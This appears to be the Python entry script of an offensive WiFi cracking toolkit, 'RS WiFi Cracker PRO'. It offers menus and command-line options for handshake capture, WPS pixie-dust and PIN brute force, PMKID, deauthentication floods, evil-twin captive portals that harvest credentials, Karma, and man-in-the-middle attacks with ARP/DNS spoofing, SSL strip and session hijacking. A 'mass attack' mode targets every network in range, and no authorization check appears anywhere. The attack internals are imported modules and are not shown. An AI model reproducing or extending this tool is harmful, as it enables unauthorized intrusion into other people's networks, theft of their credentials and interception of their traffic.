#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                     RS WIFI CRACKER PRO - MAIN ENTRY                      ║
║                        T3rmuxk1ng Edition v3.0                            ║
║                         Private Release Build                              ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import argparse
import threading
import multiprocessing
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))

from core.scanner import NetworkScanner
from core.capturer import HandshakeCapturer
from core.cracker import PasswordCracker
from core.attacker import AttackEngine
from core.monitor import RealtimeMonitor
from core.database import Database
from core.dashboard import Dashboard
from utils.interface import InterfaceManager
from utils.wordlist import WordlistGenerator
from utils.logger import Logger
from utils.config import Config
from utils.display import Display
from modules.wps_attack import WPSAttacker
from modules.evil_twin import EvilTwin
from modules.pmkid import PMKIDAttacker
from modules.deauth import DeauthAttacker
from modules.karma import KarmaAttacker
from modules.mitm import MITMAttacker
from modules.hashcat_bridge import HashcatBridge
from modules.ai_cracker import AICracker
from modules.report_gen import ReportGenerator
from plugins.plugin_manager import PluginManager

__version__ = "3.0.0"
__author__ = "T3rmuxk1ng"
__release__ = "Private"

class RSWiFiCrackerPRO:
    """Main Application Class"""
    
    def __init__(self):
        self.version = __version__
        self.project_root = PROJECT_ROOT
        self.running = False
        self.config = Config()
        self.logger = Logger()
        self.display = Display()
        self.db = Database()
        
        # Core modules
        self.interface_mgr = InterfaceManager()
        self.scanner = None
        self.capturer = None
        self.cracker = None
        self.attacker = None
        self.monitor = None
        
        # Advanced modules
        self.wps_attacker = None
        self.evil_twin = None
        self.pmkid_attacker = None
        self.deauth_attacker = None
        self.karma_attacker = None
        self.mitm_attacker = None
        self.hashcat_bridge = None
        self.ai_cracker = None
        
        # Utilities
        self.wordlist_gen = WordlistGenerator()
        self.report_gen = ReportGenerator()
        self.plugin_mgr = PluginManager()
        self.dashboard = None
        
        # State
        self.selected_interface = None
        self.selected_networks = []
        self.scan_results = []
        self.attack_queue = []
        self.results = {}
    
    def initialize(self, interface: str = None):
        """Initialize all modules"""
        self.logger.info("Initializing T3RMUXK1NG WiFi Cracker PRO...")
        
        # Check root
        if os.geteuid() != 0:
            self.display.error("This tool requires root privileges!")
            self.display.info("Run with: sudo python3 t3rmuxk1ng_wifi_pro.py")
            sys.exit(1)
        
        # Initialize database
        self.db.initialize()
        
        # Load config
        self.config.load()
        
        # Load plugins
        self.plugin_mgr.load_all()
        
        # Select interface
        if interface:
            self.selected_interface = interface
        else:
            interfaces = self.interface_mgr.list_wireless()
            if not interfaces:
                self.display.error("No wireless interfaces found!")
                sys.exit(1)
            self.selected_interface = self.interface_mgr.select(interfaces)
        
        # Initialize core modules with interface
        self.scanner = NetworkScanner(self.selected_interface)
        self.capturer = HandshakeCapturer(self.selected_interface)
        self.cracker = PasswordCracker()
        self.attacker = AttackEngine(self.selected_interface)
        self.monitor = RealtimeMonitor(self.selected_interface)
        
        # Initialize advanced modules
        self.wps_attacker = WPSAttacker(self.selected_interface)
        self.evil_twin = EvilTwin(self.selected_interface)
        self.pmkid_attacker = PMKIDAttacker(self.selected_interface)
        self.deauth_attacker = DeauthAttacker(self.selected_interface)
        self.karma_attacker = KarmaAttacker(self.selected_interface)
        self.mitm_attacker = MITMAttacker(self.selected_interface)
        self.hashcat_bridge = HashcatBridge()
        self.ai_cracker = AICracker()
        
        self.logger.success("All modules initialized!")
        self.running = True
    
    def run_interactive(self):
        """Run interactive menu"""
        while self.running:
            self.display.main_menu()
            choice = input(f"\n{self.display.color('yellow')}T3RMUXK1NG-PRO> {self.display.color('reset')}")
            
            if choice == '0':
                self.shutdown()
            elif choice == '1':
                self.scan_networks()
            elif choice == '2':
                self.select_targets()
            elif choice == '3':
                self.capture_handshakes()
            elif choice == '4':
                self.crack_passwords()
            elif choice == '5':
                self.wps_attack()
            elif choice == '6':
                self.evil_twin_attack()
            elif choice == '7':
                self.pmkid_attack()
            elif choice == '8':
                self.deauth_attack()
            elif choice == '9':
                self.karma_attack()
            elif choice == '10':
                self.mitm_attack()
            elif choice == '11':
                self.auto_attack()
            elif choice == '12':
                self.mass_attack()
            elif choice == '13':
                self.start_dashboard()
            elif choice == '14':
                self.generate_wordlist()
            elif choice == '15':
                self.generate_report()
            elif choice == '16':
                self.plugin_menu()
            elif choice == '17':
                self.settings_menu()
            elif choice == '99':
                self.display.help()
            else:
                self.display.error("Invalid option")
    
    def scan_networks(self):
        """Scan for networks"""
        self.display.section("Network Scanner")
        
        options = [
            ("Quick Scan (15s)", 15),
            ("Normal Scan (30s)", 30),
            ("Deep Scan (60s)", 60),
            ("Extended Scan (120s)", 120),
            ("Continuous Scan", -1),
            ("Channel-specific Scan", 0),
            ("Band Scan (2.4GHz + 5GHz)", -2),
        ]
        
        for i, (name, _) in enumerate(options, 1):
            self.display.menu_item(i, name)
        
        choice = input(f"\n{self.display.color('yellow')}Select: {self.display.color('reset')}")
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(options):
                duration = options[idx][1]
                
                if duration == -1:
                    self.scanner.scan_continuous()
                elif duration == -2:
                    self.scanner.scan_bands()
                elif duration == 0:
                    channel = int(input("Channel: "))
                    self.scanner.scan_channel(channel)
                else:
                    results = self.scanner.scan(duration)
                    self.scan_results = results
                    self.display_networks(results)
        except (ValueError, IndexError):
            self.display.error("Invalid selection")

    def display_networks(self, networks):
        """Display scan results"""
        self.display.table_header([
            ("#", 3), ("BSSID", 18), ("ESSID", 25), 
            ("CH", 4), ("PWR", 6), ("ENC", 10), 
            ("WPS", 5), ("CLIENTS", 8)
        ])
        
        for i, net in enumerate(networks, 1):
            wps = "Yes" if net.wps else "No"
            self.display.table_row([
                str(i), net.bssid, net.essid[:25],
                str(net.channel), f"{net.power} dBm",
                net.encryption[:10], wps, str(net.clients)
            ])
        
        self.display.info(f"Total: {len(networks)} networks")
    
    def select_targets(self):
        """Select target networks"""
        if not self.scan_results:
            self.display.error("Scan networks first!")
            return
        
        self.display_networks(self.scan_results)
        
        selection = input(f"\n{self.display.color('yellow')}Select targets (comma-separated or 'all'): {self.display.color('reset')}")
        
        if selection.lower() == 'all':
            self.selected_networks = self.scan_results.copy()
        else:
            indices = [int(x.strip()) - 1 for x in selection.split(',')]
            self.selected_networks = [self.scan_results[i] for i in indices if 0 <= i < len(self.scan_results)]
        
        self.display.success(f"Selected {len(self.selected_networks)} targets")
    
    def capture_handshakes(self):
        """Capture WPA/WPA2 handshakes"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("Handshake Capture")
        
        for target in self.selected_networks:
            self.display.target(f"Capturing: {target.essid} ({target.bssid})")
            
            options = [
                ("Quick (30s)", 30),
                ("Normal (60s)", 60),
                ("Extended (120s)", 120),
                ("Aggressive (with deauth)", -1),
                ("Silent (no deauth)", -2),
            ]
            
            for i, (name, _) in enumerate(options, 1):
                self.display.menu_item(i, name)
            
            choice = input("Select: ")
            
            try:
                idx = int(choice) - 1
                duration = options[idx][1]
                
                if duration == -1:
                    success, cap_file = self.capturer.capture_aggressive(target)
                elif duration == -2:
                    success, cap_file = self.capturer.capture_silent(target)
                else:
                    success, cap_file = self.capturer.capture(target, duration)
                
                if success:
                    self.display.success(f"Handshake captured: {cap_file}")
                    self.results[target.bssid] = {'handshake': cap_file}
                else:
                    self.display.warning("No handshake captured")
            except (ValueError, IndexError):
                self.display.error("Invalid selection")
    
    def crack_passwords(self):
        """Crack captured handshakes"""
        self.display.section("Password Cracker")
        
        methods = [
            ("Dictionary Attack", "dictionary"),
            ("Brute Force Attack", "brute"),
            ("Rule-based Attack", "rule"),
            ("Combinator Attack", "combo"),
            ("AI-powered Attack", "ai"),
            ("Hybrid Attack", "hybrid"),
            ("Mask Attack", "mask"),
        ]
        
        for i, (name, _) in enumerate(methods, 1):
            self.display.menu_item(i, name)
        
        choice = input(f"\n{self.display.color('yellow')}Select method: {self.display.color('reset')}")
        
        try:
            idx = int(choice) - 1
            method = methods[idx][1]
            
            # Get cap file
            cap_file = input("Capture file path (or press Enter to list): ").strip()
            if not cap_file:
                cap_files = list(Path("/tmp").glob("*.cap"))
                for i, f in enumerate(cap_files, 1):
                    self.display.menu_item(i, str(f))
                
                sel = input("Select: ")
                cap_file = str(cap_files[int(sel) - 1])
            
            # Get wordlist
            wordlist = input("Wordlist path (or press Enter for default): ").strip()
            if not wordlist:
                wordlist = str(self.project_root / "wordlists" / "wifi_common.txt")
            
            result = self.cracker.crack(cap_file, wordlist, method)
            
            if result['success']:
                self.display.success(f"Password found: {result['password']}")
            else:
                self.display.error("Password not found")
        except (ValueError, IndexError):
            self.display.error("Invalid selection")
    
    def wps_attack(self):
        """WPS Attack Suite"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("WPS Attack Suite")
        
        attacks = [
            ("Pixie Dust Attack", "pixie"),
            ("PIN Brute Force", "brute"),
            ("Null PIN Attack", "null"),
            ("Custom PIN Attack", "custom"),
            ("Auto-Detect & Attack", "auto"),
        ]
        
        for i, (name, _) in enumerate(attacks, 1):
            self.display.menu_item(i, name)
        
        choice = input("Select attack: ")
        
        for target in self.selected_networks:
            if not target.wps:
                self.display.warning(f"WPS not detected on {target.essid}, skipping...")
                continue
            
            self.display.target(f"Attacking: {target.essid}")
            
            try:
                idx = int(choice) - 1
                attack_type = attacks[idx][1]
                
                result = self.wps_attacker.attack(target.bssid, attack_type)
                
                if result['success']:
                    self.display.success(f"Password: {result['password']}")
                    self.results[target.bssid] = result
            except (ValueError, IndexError):
                self.display.error("Invalid selection")
    
    def evil_twin_attack(self):
        """Evil Twin Attack"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("Evil Twin Attack")
        
        target = self.selected_networks[0]
        
        options = [
            ("Open Network (no password)", "open"),
            ("WPA2 Clone", "wpa2"),
            ("Captive Portal (credential harvest)", "portal"),
            ("DNS Spoofing", "dns"),
            ("SSL Strip", "sslstrip"),
            ("Full Suite (all attacks)", "full"),
        ]
        
        for i, (name, _) in enumerate(options, 1):
            self.display.menu_item(i, name)
        
        choice = input("Select: ")
        
        try:
            idx = int(choice) - 1
            attack_type = options[idx][1]
            
            self.evil_twin.start(target, attack_type)
            
            self.display.info("Evil Twin running. Press Ctrl+C to stop.")
            
            while True:
                creds = self.evil_twin.get_credentials()
                if creds:
                    self.display.success(f"Captured: {creds}")
        except KeyboardInterrupt:
            self.evil_twin.stop()
            self.display.info("Evil Twin stopped")
    
    def pmkid_attack(self):
        """PMKID Attack"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("PMKID Attack")
        
        for target in self.selected_networks:
            self.display.target(f"Attacking: {target.essid}")
            
            result = self.pmkid_attacker.attack(target.bssid)
            
            if result['success']:
                self.display.success(f"PMKID captured: {result['pmkid_file']}")
                self.results[target.bssid] = result
    
    def deauth_attack(self):
        """Deauthentication Attack"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("Deauthentication Attack")
        
        modes = [
            ("Targeted (specific client)", "targeted"),
            ("Broadcast (all clients)", "broadcast"),
            ("Random (chaos mode)", "random"),
            ("Persistent (continuous)", "persistent"),
            ("Smart (auto-target)", "smart"),
        ]
        
        for i, (name, _) in enumerate(modes, 1):
            self.display.menu_item(i, name)
        
        choice = input("Select mode: ")
        
        try:
            idx = int(choice) - 1
            mode = modes[idx][1]
            
            count = int(input("Number of packets (0=continuous): "))
            
            for target in self.selected_networks:
                self.display.target(f"Deauthing: {target.essid}")
                self.deauth_attacker.attack(target.bssid, mode, count)
        except (ValueError, IndexError):
            self.display.error("Invalid selection")
    
    def karma_attack(self):
        """Karma Attack"""
        self.display.section("Karma Attack")
        
        self.karma_attacker.start()
        
        self.display.info("Karma attack running. Press Ctrl+C to stop.")
        
        try:
            while True:
                probe = self.karma_attacker.get_probe()
                if probe:
                    self.display.info(f"Probe from: {probe}")
        except KeyboardInterrupt:
            self.karma_attacker.stop()
    
    def mitm_attack(self):
        """Man-in-the-Middle Attack"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("MITM Attack")
        
        attacks = [
            ("ARP Spoofing", "arp"),
            ("DNS Spoofing", "dns"),
            ("SSL Strip", "sslstrip"),
            ("Session Hijacking", "session"),
            ("Credential Harvesting", "creds"),
            ("Full MITM Suite", "full"),
        ]
        
        for i, (name, _) in enumerate(attacks, 1):
            self.display.menu_item(i, name)
        
        choice = input("Select attack: ")
        
        try:
            idx = int(choice) - 1
            attack_type = attacks[idx][1]
            
            self.mitm_attacker.start(self.selected_networks[0], attack_type)
            
            self.display.info("MITM running. Press Ctrl+C to stop.")
            
            while True:
                data = self.mitm_attacker.get_intercepted()
                if data:
                    self.display.info(f"Intercepted: {data}")
        except KeyboardInterrupt:
            self.mitm_attacker.stop()
    
    def auto_attack(self):
        """Automated Attack"""
        if not self.selected_networks:
            self.display.error("Select targets first!")
            return
        
        self.display.section("Auto Attack Mode")
        
        self.display.info("This will automatically:")
        self.display.info("  1. Enable monitor mode")
        self.display.info("  2. Capture handshakes")
        self.display.info("  3. Attempt WPS attacks")
        self.display.info("  4. Crack passwords")
        
        confirm = input("Continue? [y/N]: ")
        if confirm.lower() != 'y':
            return
        
        for target in self.selected_networks:
            self.display.target(f"\nAttacking: {target.essid}")
            
            # Try WPS first (faster)
            if target.wps:
                self.display.info("Trying WPS Pixie Dust...")
                result = self.wps_attacker.attack(target.bssid, "pixie")
                if result['success']:
                    self.display.success(f"Password (WPS): {result['password']}")
                    self.results[target.bssid] = result
                    continue
            
            # Try PMKID
            self.display.info("Trying PMKID attack...")
            result = self.pmkid_attacker.attack(target.bssid)
            
            if result['success']:
                # Crack PMKID
                crack_result = self.cracker.crack_pmkid(result['pmkid_file'])
                if crack_result['success']:
                    self.display.success(f"Password (PMKID): {crack_result['password']}")
                    self.results[target.bssid] = crack_result
                    continue
            
            # Try handshake capture
            self.display.info("Capturing handshake...")
            success, cap_file = self.capturer.capture_aggressive(target)
            
            if success:
                # Generate targeted wordlist
                wordlist = self.wordlist_gen.generate_targeted(target.essid)
                
                # Crack
                crack_result = self.cracker.crack(cap_file, wordlist, "dictionary")
                if crack_result['success']:
                    self.display.success(f"Password (Handshake): {crack_result['password']}")
                    self.results[target.bssid] = crack_result
    
    def mass_attack(self):
        """Mass Attack on All Networks"""
        if not self.scan_results:
            self.display.error("Scan networks first!")
            return
        
        self.display.section("Mass Attack Mode")
        
        self.display.warning("This will attack ALL networks in range!")
        confirm = input("Continue? [y/N]: ")
        if confirm.lower() != 'y':
            return
        
        self.selected_networks = self.scan_results.copy()
        self.auto_attack()
    
    def start_dashboard(self):
        """Start web dashboard"""
        self.display.section("Web Dashboard")
        
        port = input("Port [8080]: ").strip() or "8080"
        
        self.dashboard = Dashboard(port=int(port))
        self.dashboard.start()
        
        self.display.success(f"Dashboard running at http://localhost:{port}")
    
    def generate_wordlist(self):
        """Generate custom wordlist"""
        self.display.section("Wordlist Generator")
        
        options = [
            ("From ESSID", "essid"),
            ("Common WiFi Passwords", "common"),
            ("From Company Info", "company"),
            ("From Social Media", "social"),
            ("AI-Generated", "ai"),
            ("Mega Wordlist (combine all)", "mega"),
        ]
        
        for i, (name, _) in enumerate(options, 1):
            self.display.menu_item(i, name)
        
        choice = input("Select: ")
        
        try:
            idx = int(choice) - 1
            wordlist_type = options[idx][1]
            
            output = input("Output filename: ").strip()
            if not output:
                output = f"wordlist_{int(time.time())}.txt"
            
            output_path = self.project_root / "wordlists" / output
            
            if wordlist_type == "essid":
                essid = input("ESSID: ")
                self.wordlist_gen.from_essid(essid, output_path)
            elif wordlist_type == "common":
                self.wordlist_gen.common(output_path)
            elif wordlist_type == "company":
                name = input("Company name: ")
                self.wordlist_gen.from_company(name, output_path)
            elif wordlist_type == "social":
                username = input("Username: ")
                self.wordlist_gen.from_social(username, output_path)
            elif wordlist_type == "ai":
                prompt = input("Describe target: ")
                self.ai_cracker.generate_wordlist(prompt, output_path)
            elif wordlist_type == "mega":
                self.wordlist_gen.mega(output_path)
            
            self.display.success(f"Wordlist saved: {output_path}")
        except (ValueError, IndexError):
            self.display.error("Invalid selection")
    
    def generate_report(self):
        """Generate attack report"""
        self.display.section("Report Generator")
        
        formats = ["PDF", "HTML", "JSON", "CSV", "Markdown"]
        
        for i, fmt in enumerate(formats, 1):
            self.display.menu_item(i, fmt)
        
        choice = input("Select format: ")
        
        try:
            fmt = formats[int(choice) - 1].lower()
            
            output = input("Output filename: ").strip()
            if not output:
                output = f"report_{int(time.time())}"
            
            self.report_gen.generate(self.results, fmt, output)
            self.display.success(f"Report saved: {output}")
        except (ValueError, IndexError):
            self.display.error("Invalid selection")
    
    def plugin_menu(self):
        """Plugin management"""
        self.display.section("Plugin Manager")
        
        plugins = self.plugin_mgr.list_plugins()
        
        for i, plugin in enumerate(plugins, 1):
            status = "Enabled" if plugin['enabled'] else "Disabled"
            self.display.menu_item(i, f"{plugin['name']} [{status}]")
        
        # Plugin management options
        self.display.menu_item(len(plugins) + 1, "Install Plugin")
        self.display.menu_item(len(plugins) + 2, "Create Plugin")
    
    def settings_menu(self):
        """Settings menu"""
        self.display.section("Settings")
        
        options = [
            "Interface Settings",
            "Attack Settings",
            "Output Settings",
            "Logging Settings",
            "Plugin Settings",
            "Reset to Defaults",
        ]
        
        for i, opt in enumerate(options, 1):
            self.display.menu_item(i, opt)
    
    def shutdown(self):
        """Clean shutdown"""
        self.display.info("Shutting down...")
        
        # Stop all running attacks
        if self.evil_twin:
            self.evil_twin.stop()
        if self.karma_attacker:
            self.karma_attacker.stop()
        if self.mitm_attacker:
            self.mitm_attacker.stop()
        if self.deauth_attacker:
            self.deauth_attacker.stop()
        if self.dashboard:
            self.dashboard.stop()
        
        # Restore interface
        if self.selected_interface:
            self.interface_mgr.disable_monitor_mode(self.selected_interface)
        
        # Save results
        self.db.save_results(self.results)
        
        self.running = False
        self.display.success("Goodbye!")
    
    def run_cli(self, args):
        """Run in CLI mode"""
        self.initialize(args.interface)
        
        if args.scan:
            results = self.scanner.scan(30)
            self.display_networks(results)
        
        elif args.attack:
            if not args.target:
                self.display.error("Target BSSID required!")
                return
            
            if args.attack == "wps":
                result = self.wps_attacker.attack(args.target, "pixie")
            elif args.attack == "pmkid":
                result = self.pmkid_attacker.attack(args.target)
            elif args.attack == "deauth":
                self.deauth_attacker.attack(args.target, "broadcast", args.count or 10)
                result = {'success': True}
            elif args.attack == "handshake":
                success, cap_file = self.capturer.capture_aggressive(
                    type('Target', (), {'bssid': args.target, 'channel': args.channel or 1, 'essid': ''})()
                )
                result = {'success': success, 'cap_file': cap_file}
            
            if result.get('success'):
                self.display.success(f"Success: {result.get('password', 'Completed')}")
            else:
                self.display.error("Attack failed")
        
        elif args.crack:
            if not args.wordlist:
                args.wordlist = str(self.project_root / "wordlists" / "wifi_common.txt")
            
            result = self.cracker.crack(args.crack, args.wordlist, args.method or "dictionary")
            
            if result['success']:
                self.display.success(f"Password: {result['password']}")
            else:
                self.display.error("Password not found")
        
        elif args.evil_twin:
            target = type('Target', (), {'bssid': '', 'channel': 1, 'essid': args.ssid or "FreeWiFi"})()
            self.evil_twin.start(target, "portal")
            
            try:
                while True:
                    creds = self.evil_twin.get_credentials()
                    if creds:
                        self.display.success(f"Credentials: {creds}")
            except KeyboardInterrupt:
                self.evil_twin.stop()


def main():
    parser = argparse.ArgumentParser(
        description="T3RMUXK1NG WiFi Cracker PRO - Advanced WiFi Security Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-i', '--interface', help='Wireless interface to use')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for networks')
    parser.add_argument('-a', '--attack', choices=['wps', 'pmkid', 'deauth', 'handshake'],
                       help='Attack type to perform')
    parser.add_argument('-t', '--target', help='Target BSSID')
    parser.add_argument('-c', '--channel', type=int, help='Target channel')
    parser.add_argument('--count', type=int, help='Number of packets (deauth)')
    parser.add_argument('--crack', help='Capture file to crack')
    parser.add_argument('-w', '--wordlist', help='Wordlist for cracking')
    parser.add_argument('-m', '--method', choices=['dictionary', 'brute', 'rule', 'ai'],
                       help='Cracking method')
    parser.add_argument('--evil-twin', action='store_true', help='Start Evil Twin AP')
    parser.add_argument('--ssid', help='SSID for Evil Twin')
    parser.add_argument('--dashboard', action='store_true', help='Start web dashboard')
    parser.add_argument('--port', type=int, default=8080, help='Dashboard port')
    parser.add_argument('-v', '--version', action='version', version=f'T3RMUXK1NG WiFi Cracker PRO v{__version__}')
    
    args = parser.parse_args()
    
    app = RSWiFiCrackerPRO()
    
    if len(sys.argv) == 1:
        # Interactive mode
        app.display.banner()
        app.initialize()
        app.run_interactive()
    else:
        # CLI mode
        app.run_cli(args)


if __name__ == '__main__':
    main()
